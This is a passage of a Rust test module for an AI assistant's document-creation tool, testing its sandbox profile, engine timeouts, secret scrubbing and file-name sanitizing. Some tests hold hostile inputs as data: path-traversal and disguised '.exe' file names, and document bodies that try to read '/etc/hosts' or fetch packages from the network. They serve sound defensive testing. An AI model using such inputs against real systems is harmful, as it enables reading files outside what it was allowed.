        std::fs::create_dir(&ours).unwrap();
        open(&ours);
        private_folder(&ours, uid).unwrap();
        assert_eq!(mode(&ours), 0o700);
        // Someone else's is refused, and left as it is.
        open(&ours);
        assert!(private_folder(&ours, uid + 1).is_err());
        assert_eq!(mode(&ours), 0o755);
        // So is a link, even to a folder of ours.
        let link = root.path().join("link");
        std::os::unix::fs::symlink(&fresh, &link).unwrap();
        assert!(private_folder(&link, uid).is_err());
    }

    /// A stand-in `sandbox-exec` that logs its arguments, and fails its
    /// probe when `works` is false; otherwise it runs the engine.
    fn stub_sandbox(dir: &Path, works: bool) -> PathBuf {
        let probe = if works {
            String::new()
        } else {
            "case \"$*\" in *--version*) exit 1 ;; esac".into()
        };
        stub_sandbox_probing(dir, &probe)
    }

    /// [`stub_sandbox`] whose probe fails the first time only.
    fn stub_sandbox_failing_once(dir: &Path) -> PathBuf {
        let marker = dir.join("probed").display().to_string();
        stub_sandbox_probing(
            dir,
            &format!(
                "case \"$*\" in *--version*) [ -e '{marker}' ] || {{ : > '{marker}'; exit 1; }} ;; esac"
            ),
        )
    }

    /// A stand-in `sandbox-exec` that logs its arguments, runs `probe`, then
    /// the engine.
    fn stub_sandbox_probing(dir: &Path, probe: &str) -> PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let path = dir.join("sandbox-exec");
        let log = dir.join("sandbox.log").display().to_string();
        std::fs::write(
            &path,
            format!(
                "#!/bin/sh\nprintf '%s' \"$*\" | tr '\\n' ' ' >> '{log}'\necho >> '{log}'\n{probe}\nwhile [ \"$1\" = -D ]; do shift 2; done\n[ \"$1\" = -p ] && shift 2\nexec \"$@\"\n"
            ),
        )
        .unwrap();
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        path
    }

    fn sandbox_log(f: &Fixture) -> Vec<String> {
        std::fs::read_to_string(f.root.path().join("sandbox.log"))
            .unwrap_or_default()
            .lines()
            .map(str::to_owned)
            .collect()
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn officecli_runs_in_the_sandbox_once_its_probe_passes() {
        let script = officecli(
            r#"{"results":[{"index":0,"success":true}]}"#,
            NO_ISSUES,
            r#"{"slides":1}"#,
        );
        let f = fixture_in(Some(&script), None, |dir| Some(stub_sandbox(dir, true)));
        let first = f
            .call(
                "call-1",
                json!({"name": "a", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        f.call(
            "call-2",
            json!({"name": "b", "format": "pptx", "content": deck()}),
        )
        .await
        .unwrap();
        let log = sandbox_log(&f);
        // One probe, then every officecli run of both documents.
        assert_eq!(
            log.iter()
                .filter(|line| line.ends_with("--version"))
                .count(),
            1
        );
        assert!(log
            .iter()
            .any(|line| line.contains(" batch out.pptx --input batch.json --json")));
        assert_eq!(
            log.iter()
                .filter(|line| line.contains(" create out.pptx"))
                .count(),
            2
        );
        assert!(log.iter().all(|line| line.contains("(deny network*)")));
        let dir = PathBuf::from(first["filePath"].as_str().unwrap())
            .parent()
            .unwrap()
            .canonicalize()
            .unwrap();
        assert!(log
            .iter()
            .any(|line| line.contains(&format!("DOC={}", dir.display()))));
        assert_eq!(first["file"]["slides"], 1);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_data_image_works_under_the_profile_that_hides_the_users_files() {
        let script = officecli(
            r#"{"results":[{"index":0,"success":true}]}"#,
            NO_ISSUES,
            r#"{"slides":1}"#,
        );
        let f = fixture_in(Some(&script), None, |dir| Some(stub_sandbox(dir, true)));
        let content = json!([
            {"command": "add", "parent": "/", "type": "slide"},
            {"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgo=", "alt": "Dot"}},
        ]);
        let result = f
            .call(
                "call-1",
                json!({"name": "a", "format": "pptx", "content": content}),
            )
            .await
            .unwrap();
        let dir = PathBuf::from(result["filePath"].as_str().unwrap())
            .parent()
            .unwrap()
            .canonicalize()
            .unwrap();
        let batch = sandbox_log(&f)
            .into_iter()
            .find(|line| line.contains(" batch out.pptx "))
            .unwrap();
        // Of the user's folders only the document's own is readable.
        for rule in [
            "(deny network*)",
            r#"(deny file-read-data (subpath "/Users") (subpath "/Volumes"))"#,
            "(deny file-write*)",
            r#"(allow file-read-data file-write* (subpath (param "DOC")))"#,
            r#"(allow file-read-data file-write* (subpath (param "SCRATCH")))"#,
            &format!("-D DOC={}", dir.display()),
            &format!("-D SCRATCH={}", officecli_scratch().unwrap().display()),
            // officecli's own folder is its engine root.
            &format!(
                "-D ENGINE={} ",
                real(&f.env.runtime.join("engines/officecli"))
            ),
        ] {
            assert!(batch.contains(rule), "{rule}: {batch}");
        }
        let seen: Value =
            serde_json::from_slice(&std::fs::read(dir.join("batch-seen.json")).unwrap()).unwrap();
        assert_eq!(seen, content);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn officecli_runs_without_the_sandbox_when_it_does_not_work() {
        let script = officecli(
            r#"{"results":[{"index":0,"success":true}]}"#,
            NO_ISSUES,
            "{}",
        );
        let f = fixture_in(Some(&script), None, |dir| Some(stub_sandbox(dir, false)));
        for call in ["call-1", "call-2"] {
            f.call(
                call,
                json!({"name": "a", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        }
        // Probed for each document, as a failure is not kept; the documents
        // were made without it.
        let log = sandbox_log(&f);
        assert_eq!(log.len(), 2, "{log:?}");
        assert!(
            log.iter().all(|line| line.ends_with("--version")),
            "{log:?}"
        );
        assert!(f.host.office_sandbox.works.get().is_none());

        // No sandbox-exec at all: the same.
        let f = fixture_in(Some(&script), None, |dir| Some(dir.join("missing")));
        f.call(
            "call-1",
            json!({"name": "a", "format": "pptx", "content": deck()}),
        )
        .await
        .unwrap();
        assert!(sandbox_log(&f).is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_failed_sandbox_probe_is_tried_again_with_the_next_document() {
        let script = officecli(
            r#"{"results":[{"index":0,"success":true}]}"#,
            NO_ISSUES,
            r#"{"slides":1}"#,
        );
        let f = fixture_in(Some(&script), None, |dir| {
            Some(stub_sandbox_failing_once(dir))
        });
        for call in ["call-1", "call-2", "call-3"] {
            f.call(
                call,
                json!({"name": "a", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        }
        let log = sandbox_log(&f);
        // The first document ran without it; the second probed again, and it
        // and the third ran in it with no further probe.
        let probes: Vec<_> = log
            .iter()
            .enumerate()
            .filter(|(_, line)| line.ends_with("--version"))
            .map(|(at, _)| at)
            .collect();
        assert_eq!(probes, [0, 1], "{log:?}");
        assert_eq!(
            log.iter()
                .filter(|line| line.contains(" create out.pptx"))
                .count(),
            2,
            "{log:?}"
        );
        assert!(f.host.office_sandbox.works.get().is_some());
    }

    /// A stand-in Python engine in a fixture's runtime folder, whose `node`
    /// logs each run's arguments to `node.log`, and a document's folders.
    struct Python {
        node: PathBuf,
        runtime: PathBuf,
        dir: PathBuf,
        home: PathBuf,
        log: PathBuf,
    }

    fn stand_in_python(f: &Fixture) -> Python {
        use std::os::unix::fs::PermissionsExt;
        let runtime = f.env.runtime.clone();
        let node = runtime.join("node/node");
        let log = f.root.path().join("node.log");
        std::fs::create_dir_all(node.parent().unwrap()).unwrap();
        std::fs::write(
            &node,
            format!("#!/bin/sh\necho \"$*\" >> '{}'\n", log.display()),
        )
        .unwrap();
        std::fs::set_permissions(&node, std::fs::Permissions::from_mode(0o755)).unwrap();
        let dir = f.root.path().join("python-doc");
        let home = dir.join("home");
        std::fs::create_dir_all(&home).unwrap();
        Python {
            node,
            runtime,
            dir,
            home,
            log,
        }
    }

    impl Python {
        /// The engine's work as `create_document` sets it up, before
        /// [`AssistantHost::python_engine`] gives it a sandbox.
        fn work(&self) -> Work<'_> {
            Work {
                exe: &self.node,
                dir: &self.dir,
                home: &self.home,
                name: "Python",
                sandbox: None,
                profile: PYTHON_SANDBOX,
                scratch: None,
                read_root: Some(&self.runtime),
                timeout: PYTHON_TIMEOUT,
            }
        }

        /// The arguments of each run of the engine itself.
        fn runs(&self) -> Vec<String> {
            std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .map(str::to_owned)
                .collect()
        }
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn python_runs_under_sandbox_exec_with_its_profile() {
        let f = fixture_in(None, None, |dir| Some(stub_sandbox(dir, true)));
        let python = stand_in_python(&f);
        let sandbox = f.host.python_engine(&python.work()).await.unwrap();
        let work = Work {
            sandbox: Some(&sandbox),
            ..python.work()
        };
        let output = work
            .run(&[
                "runtime/src/python/runner.mjs",
                "--assets",
                "engines/python",
            ])
            .await
            .unwrap();
        assert_eq!(output.status, Some(0));
        assert_eq!(PYTHON_TIMEOUT, Duration::from_secs(90));
        // The probe, then the run: both under the Python profile, whose
        // engine root is the whole runtime folder (Node, the runner and the
        // assets are in different folders of it).
        let log = sandbox_log(&f);
        assert_eq!(log.len(), 2, "{log:?}");
        assert!(log[0].ends_with(" --version"), "{log:?}");
        assert!(
            log[1].ends_with(" runtime/src/python/runner.mjs --assets engines/python"),
            "{log:?}"
        );
        let profile = format!("-p {}", PYTHON_SANDBOX.replace('\n', " "));
        let root = format!("-D ENGINE={} ", real(&python.runtime));
        let doc = format!("-D DOC={} ", real(&python.dir));
        for line in &log {
            for wanted in [&profile, &root, &doc] {
                assert!(line.contains(wanted.as_str()), "{wanted}: {line}");
            }
        }
        assert_eq!(
            python.runs(),
            [
                "--version",
                "runtime/src/python/runner.mjs --assets engines/python"
            ]
        );
        // What the profile allows: no network; of the user's folders read
        // only the document's and the runtime's; write only the document's.
        for rule in [
            "(deny network*)",
            r#"(deny file-read-data (subpath "/Users") (subpath "/Volumes"))"#,
            "(deny file-write*)",
            r#"(allow file-read-data file-write* (subpath (param "DOC")))"#,
            r#"(allow file-read-data (subpath (param "ENGINE")))"#,
        ] {
            assert!(PYTHON_SANDBOX.contains(rule), "{rule}");
        }
        assert!(!PYTHON_SANDBOX.contains("SCRATCH"));
        assert!(f.host.python_sandbox.works.get().is_some());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn python_is_unavailable_when_the_probe_fails() {
        let f = fixture_in(None, None, |dir| Some(stub_sandbox(dir, false)));
        let python = stand_in_python(&f);
        // Unlike officecli, a failed probe leaves no engine at all; it is
        // not kept, so the next document probes again.
        assert_eq!(f.host.python_engine(&python.work()).await, None);
        assert_eq!(f.host.python_engine(&python.work()).await, None);
        let log = sandbox_log(&f);
        assert_eq!(log.len(), 2, "{log:?}");
        assert!(log.iter().all(|line| line.ends_with(" --version")));
        assert!(f.host.python_sandbox.works.get().is_none());
        // And its work refuses to start without the sandbox.
        let error = python
            .work()
            .run(&["runtime/src/python/runner.mjs"])
            .await
            .unwrap_err();
        assert_eq!(code(&error), FAILED);
        assert!(error.contains("Python runs only in its sandbox"), "{error}");
        assert!(python.runs().is_empty(), "{:?}", python.runs());

        // No sandbox-exec at all: the same.
        let f = fixture_in(None, None, |dir| Some(dir.join("missing")));
        let python = stand_in_python(&f);
        assert_eq!(f.host.python_engine(&python.work()).await, None);
        assert!(python.runs().is_empty(), "{:?}", python.runs());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_slow_engine_is_stopped_at_its_timeout() {
        let root = tempfile::tempdir().unwrap();
        let exe = root.path().join(engine(root.path(), "slow", "sleep 30"));
        let dir = root.path().join("doc");
        let home = dir.join("home");
        std::fs::create_dir_all(&home).unwrap();
        let work = Work {
            exe: &exe,
            dir: &dir,
            home: &home,
            name: "officecli",
            sandbox: None,
            profile: OFFICE_SANDBOX,
            scratch: None,
            read_root: None,
            timeout: Duration::from_secs(1),
        };
        let started = std::time::Instant::now();
        let error = work.run(&[]).await.unwrap_err();
        assert!(started.elapsed() < Duration::from_secs(10));
        assert_eq!(code(&error), FAILED);
        assert!(
            error.contains("officecli did not finish within 1 seconds"),
            "{error}"
        );
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn office_format_without_engine_is_refused() {
        let f = fixture(None, None);
        for format in ["pptx", "docx", "xlsx", "pdf"] {
            let content = if format == "pdf" { json!("x") } else { deck() };
            let error = f
                .call(
                    &id(),
                    json!({"name": "a", "format": format, "content": content}),
                )
                .await
                .unwrap_err();
            assert_eq!(code(&error), "assistant_capability_disabled", "{format}");
        }
        assert!(f.outputs().is_empty());
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn engine_output_is_scrubbed_and_shows_no_private_paths() {
        let f = fixture(
            None,
            Some(&format!(
                r#"echo "error: file not found (searched at $PWD/missing.png)" >&2
echo 'error: api_key=sk-live-abcdefghijklmnopqrstuvwxyz0123 {SECRET}' >&2
exit 1"#
            )),
        );
        let error = f
            .call(
                "call-1",
                json!({"name": "r", "format": "pdf", "content": "#image(\"missing.png\")"}),
            )
            .await
            .unwrap_err();
        assert!(error.contains("searched at missing.png"), "{error}");
        assert!(!error.contains(f.root.path().to_str().unwrap()), "{error}");
        assert!(
            !error.contains("sk-live-abcdefghijklmnopqrstuvwxyz0123"),
            "{error}"
        );
        assert!(!error.contains(SECRET), "{error}");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_repeated_call_gets_its_first_answer() {
        let f = fixture(None, None);
        let args = json!({"name": "n", "format": "txt", "content": "x"});
        let first = f.call("call-1", args.clone()).await.unwrap();
        assert_eq!(f.call("call-1", args).await.unwrap(), first);
        let error = f
            .call(
                "call-1",
                json!({"name": "other", "format": "txt", "content": "x"}),
            )
            .await
            .unwrap_err();
        assert_eq!(error, "assistant_tool_call_conflict");
        assert_eq!(f.record().attachments.len(), 1);
    }

    #[test]
    fn names_lose_folders_and_take_the_format_extension() {
        for (raw, format, name) in [
            ("../x.pptx", DocumentFormat::Pptx, "x.pptx"),
            ("Q3 plan.exe", DocumentFormat::Pdf, "Q3 plan.pdf"),
            ("report.v2.docx", DocumentFormat::Docx, "report.v2.docx"),
            ("notes", DocumentFormat::Md, "notes.md"),
            ("..\\..\\evil.bat", DocumentFormat::Txt, "evil.txt"),
            ("...hidden", DocumentFormat::Csv, "hidden.csv"),
            (
                "a\u{0}b\nc<d>:|?*\".html",
                DocumentFormat::Html,
                "abcd.html",
            ),
            ("", DocumentFormat::Json, "document.json"),
            (
                "report\u{202E}fdp.exe",
                DocumentFormat::Pdf,
                "reportfdp.pdf",
            ),
            (
                "a\u{200B}b\u{FEFF}\u{2066}.txt",
                DocumentFormat::Txt,
                "ab.txt",
            ),
            ("dir/", DocumentFormat::Json, "document.json"),
        ] {
            assert_eq!(file_name(raw, format), name, "{raw:?}");
        }
        let long = file_name(&"字".repeat(300), DocumentFormat::Xlsx);
        assert_eq!(long.chars().count(), 120);
        assert!(long.ends_with(".xlsx"));
    }

    #[test]
    fn pdf_pages_counts_page_dictionaries_only() {
        assert_eq!(
            pdf_pages(b"<< /Type /Pages /Count 2 >> << /Type/Page >> << /Type /Page\n/Parent 1 0 R >> /Type /PageLabel"),
            Some(2)
        );
        assert_eq!(pdf_pages(b"%PDF-1.7 nothing"), None);
    }

    /// The bundled officecli, in its sandbox, fixes a deck's overflowing
    /// text, a shape past the right edge and dim text on a dark fill in one
    /// round. `cargo test documents::create -- --ignored`.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    #[ignore = "needs the engines of `pnpm assistant:prepare`"]
    async fn bundled_officecli_fixes_a_decks_layout() {
        let bundled = Path::new(env!("CARGO_MANIFEST_DIR")).join("../assistant-runtime/resources");
        let Some(officecli) = super::super::engines::engines_at(&bundled).officecli else {
            panic!("run `pnpm assistant:prepare` first");
        };
        let sandbox =
            |_: &Path| cfg!(target_os = "macos").then(|| PathBuf::from("/usr/bin/sandbox-exec"));
        let f = fixture_in(
            Some(&format!("link:{}", officecli.display())),
            None,
            sandbox,
        );
        let deck = json!([
            {"command": "add", "parent": "/", "type": "slide", "props": {"title": "Hi"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"name": "Body", "text": "one\ntwo\nthree\nfour\nfive\nsix\nseven", "x": "2.33cm", "y": "5.2cm", "width": "14cm", "height": "2cm", "size": "20"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"name": "Out", "text": "出界", "x": "30cm", "y": "2cm", "width": "6cm", "height": "2cm"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"name": "Dark", "text": "dim", "x": "2cm", "y": "12cm", "width": "6cm", "height": "2cm", "fill": "222222", "color": "555555"}},
        ]);
        let result = f
            .call(
                "pptx",
                json!({"name": "deck.pptx", "format": "pptx", "content": deck}),
            )
            .await
            .unwrap();
        eprintln!("pptx: {result:#}");
        assert_eq!(result["fixed"], 3);
        assert_eq!(result["issues"], json!([]));
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert_eq!(
            fix_commands(&file, "fix-1.json"),
            json!([
                {"command": "set", "path": "/slide[1]/shape[@id=100000]", "props": {"height": "6.2cm"}},
                {"command": "set", "path": "/slide[1]/shape[@id=100001]", "props": {"x": "26.597cm"}},
                {"command": "set", "path": "/slide[1]/shape[@id=100002]", "props": {"color": "FFFFFF"}},
            ])
        );
        assert!(!file.with_file_name("fix-2.json").exists());
    }

    /// The real engines, as `pnpm assistant:prepare` bundles them: run with
    /// `cargo test documents::create -- --ignored`.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    #[ignore = "needs the engines of `pnpm assistant:prepare`"]
    async fn bundled_engines_make_real_documents() {
        let bundled = Path::new(env!("CARGO_MANIFEST_DIR")).join("../assistant-runtime/resources");
        let engines = super::super::engines::engines_at(&bundled);
        let (Some(officecli), Some(typst)) = (engines.officecli, engines.typst) else {
            panic!("run `pnpm assistant:prepare` first");
        };
        let link = |target: &Path| format!("link:{}", target.display());
        // On macOS officecli runs in the real sandbox: its own folder is
        // readable there, the user's other files are not.
        let sandbox =
            |_: &Path| cfg!(target_os = "macos").then(|| PathBuf::from("/usr/bin/sandbox-exec"));
        let f = fixture_in(Some(&link(&officecli)), Some(&link(&typst)), sandbox);
        let deck = json!([
            {"command": "add", "parent": "/", "type": "slide", "props": {"title": "Quarterly plan"}},
            {"command": "add", "parent": "/slide[1]", "type": "shape", "props": {"text": "Grow\nHire", "x": "2cm", "y": "5cm", "wobble": "1"}},
            {"command": "add", "parent": "/", "type": "slide", "props": {"title": "Next"}},
            {"command": "add", "parent": "/slide[2]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "alt": "Dot"}},
        ]);
        // The profile keeps the user's other files out of reach.
        let outside = Path::new(env!("CARGO_MANIFEST_DIR")).join("Cargo.toml");
        if cfg!(target_os = "macos") && outside.starts_with("/Users") {
            let denied = std::process::Command::new("/usr/bin/sandbox-exec")
                .args([
                    "-D",
                    "DOC=/nonexistent",
                    "-D",
                    "ENGINE=/nonexistent",
                    "-D",
                    "SCRATCH=/nonexistent",
                    "-p",
                    OFFICE_SANDBOX,
                    "/bin/cat",
                ])
                .arg(&outside)
                .output()
                .unwrap();
            assert!(!denied.status.success());
            assert!(String::from_utf8_lossy(&denied.stderr).contains("Operation not permitted"));
        }
        let pptx = f
            .call(
                "pptx",
                json!({"name": "plan.pptx", "format": "pptx", "content": deck}),
            )
            .await
            .unwrap();
        eprintln!("pptx: {pptx:#}");
        assert_eq!(pptx["file"]["slides"], 2);
        assert!(pptx["issues"]
            .as_array()
            .unwrap()
            .iter()
            .any(|issue| issue["message"]
                .as_str()
                .unwrap()
                .contains("UNSUPPORTED props")));
        let svg = std::fs::read_to_string(pptx["previewPath"].as_str().unwrap()).unwrap();
        assert!(svg.trim_end().ends_with("</svg>"));

        let pdf = f
            .call("pdf", json!({"name": "report", "format": "pdf", "content": "= 第一节\n\n正文。Some text.\n\n#pagebreak()\n\n= Second\n\n- one\n- two\n"}))
            .await
            .unwrap();
        eprintln!("pdf: {pdf:#}");
        assert_eq!(pdf["issues"], json!([]));
        assert!(std::fs::read(pdf["previewPath"].as_str().unwrap())
            .unwrap()
            .starts_with(b"\x89PNG"));
        let record = f.record();
        assert_eq!(
            record.messages[0].media_for(Some("pdf")).unwrap().params["pages"],
            2
        );

        let error = f
            .call(
                "broken",
                json!({"name": "report", "format": "pdf", "content": "ok\n#text(fill: red)[open"}),
            )
            .await
            .unwrap_err();
        eprintln!("typst error: {error}");
        assert!(error.contains("line 2, column"), "{error}");
        // A package import built at run time reaches no network.
        for body in [
            "#let p = \"@\" + \"preview/cetz:0.3.4\"\n#import p: *",
            "#import \"\\u{40}preview/cetz:0.3.4\": *",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            eprintln!("typst import: {error}");
            assert!(error.contains("failed to download package"), "{error}");
        }
        // The body reads nothing outside the document's folder.
        for body in [
            "#image(\"../x.png\")",
            "#read(\"/etc/hosts\")",
            "#read(\"../../../../../../../../etc/hosts\")",
        ] {
            let error = f
                .call(
                    &id(),
                    json!({"name": "r", "format": "pdf", "content": body}),
                )
                .await
                .unwrap_err();
            eprintln!("typst outside: {error}");
            assert_eq!(code(&error), FAILED);
            assert!(
                error.contains("escape the project root") || error.contains("file not found"),
                "{error}"
            );
        }

        // Ordinary paragraphs of a Latin docx all lack a first-line indent;
        // the built-in heading style officecli adds is no issue.
        let memo = json!([
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "Memo", "style": "Heading1"}},
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "First."}},
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "Second."}},
            {"command": "add", "parent": "/body", "type": "paragraph", "props": {"text": "Third."}},
        ]);
        let docx = f
            .call(
                "docx",
                json!({"name": "memo", "format": "docx", "content": memo}),
            )
            .await
            .unwrap();
        eprintln!("docx: {docx:#}");
        assert_eq!(
            docx["issues"],
            json!([{"severity": "warning", "message": "Body paragraph missing first-line indent (3 places)"}])
        );
        if cfg!(target_os = "macos") {
            assert_eq!(
                f.host.office_sandbox.works.get(),
                Some(&PathBuf::from("/usr/bin/sandbox-exec"))
            );
        }
        // A reply makes three documents: another run for the rest.
        let f = fixture_in(Some(&link(&officecli)), Some(&link(&typst)), sandbox);
        let error = f
            .call(
                "bad-deck",
                json!({"name": "deck", "format": "pptx", "content": [
                    {"command": "add", "parent": "/", "type": "slide"},
                    {"command": "set", "path": "/slide[5]/shape[1]", "props": {"bold": "true"}},
                ]}),
            )
            .await
            .unwrap_err();
        eprintln!("officecli error: {error}");
        assert_eq!(body(&error)["items"][0]["index"], 1);

        let md = f
            .call(
                "md",
                json!({"name": "notes", "format": "md", "content": "# Notes\n"}),
            )
            .await
            .unwrap();
        eprintln!("md: {md:#}");
        assert_eq!(md["file"]["mimeType"], "text/markdown");
    }
}
